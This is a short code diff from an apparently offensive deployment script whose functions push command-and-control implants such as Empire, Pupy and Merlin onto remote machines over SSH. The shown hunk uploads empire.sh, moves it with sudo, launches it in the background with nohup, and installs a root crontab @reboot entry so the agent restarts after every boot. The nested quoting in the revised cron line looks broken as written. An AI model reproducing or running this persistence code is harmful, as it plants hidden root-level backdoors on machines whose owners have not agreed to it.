@@ -46,11 +46,11 @@ def pupy(connect):
 def empire(connect):
     ###NEEDS MORE WORK
     connect.put('UploadFiles/empire.sh')
-    connect.sudo('mv empire.sh /tmp/')
-    connect.run('nohup bash /tmp/empire.sh &')
-    connect.run("sh -c 'echo \"@reboot python /tmp/empire.sh\" > empyre.txt'")
+    connect.sudo('mv empire.sh /var/')
+    connect.run("sh -c 'echo \"@reboot sh -c 'cp /var/empire.sh /tmp/empire.sh; python /tmp/empire.sh'\" > empyre.txt'")
     connect.sudo("crontab -u root empyre.txt")
     connect.run("rm empyre.txt")
+    connect.run('nohup bash /tmp/empire.sh &')
 
 
 def merlin(connect):
